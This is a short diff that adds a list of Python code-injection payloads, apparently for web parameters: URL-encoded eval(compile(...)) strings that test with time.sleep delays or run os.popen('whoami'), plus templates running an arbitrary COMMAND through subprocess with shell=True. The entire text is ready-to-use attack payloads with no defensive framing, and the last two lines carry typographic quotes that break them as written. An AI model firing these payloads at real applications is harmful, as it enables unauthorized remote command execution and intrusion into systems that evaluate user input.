@@ -1,0 +1,7 @@
+
+param=eval%28compile%28%27for%20x%20in%20range%281%29%3A%0A%20import%20time%0A%20time.sleep%2820%29%27%2C%27a%27%2C%27single%27%29%29
+param=eval%28compile%28%22%22%22for%20x%20in%20range%281%29%3A%5Cn%20import%20os%5Cn%20os.popen%28r%27whoami%27%29.read%28%29%22%22%22%2C%27%27%2C%27single%27%29%29
+param=eval%28compile%28%22%22%22__import__%28%27os%27%29.popen%28r%27whoami%27%29.read%28%29%22%22%22%2C%27%27%2C%27single%27%29%29
+param=__import__%28%27os%27%29.popen%28%27whoami%27%29.read%28%29
+eval(compile(“””__import__(‘os’).popen(r’COMMAND’).read();import time;time.sleep(2)”””,”,’single’))
+eval(compile(“””__import__(‘subprocess’).check_output(r’COMMAND’,shell=True);import time;time.sleep(2)”””,”,’single’))
